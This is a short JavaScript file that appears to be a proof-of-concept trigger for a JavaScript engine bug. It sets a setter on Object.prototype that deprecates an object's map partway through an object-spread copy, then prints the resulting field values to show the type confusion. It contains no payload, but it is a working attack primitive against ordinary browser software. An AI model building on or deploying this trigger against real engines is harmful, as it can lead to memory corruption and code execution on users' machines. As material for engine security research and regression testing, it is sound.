var a = { n : 5 };

let return_double = function() {
    return 5.5;
}

Object.prototype.__defineSetter__(0, function() { 
    duped = this;
    duped.__defineGetter__('getter', return_double);
    duped.o = 1.1;
    duped.p = 1.1;
    duped.q = 1.1;
    duped.r = 1.1;
    duped.s = 1.1;
    duped.t = 1.1;

    /*
        1. Create `b` an object that shares a map
           map with `duped`.
    */
    b = {};
    b.n = 5; 
    b.__defineGetter__('getter', return_double);
    b.o = 1.1;
    b.p = 1.1;
    b.q = 1.1;
    b.r = 1.1;
    b.s = 1.1;
    b.t = 1.1;

    // deprecate `duped`'s map
    b.n = 1.1;


    // Fill up the SplitMap's transition array
    for (var i = 0; i < 1024 + 1024; i++) {
        var tmp = {};
        tmp.n = 5;
        tmp['tt' + i.toString()] = 5;
    }

});

var obj = { ...a , 0 : 5 , ...duped};

print(obj.o);
print(obj.p);
print(obj.q);
print(obj.r);
print(obj.s);
print(obj.t);
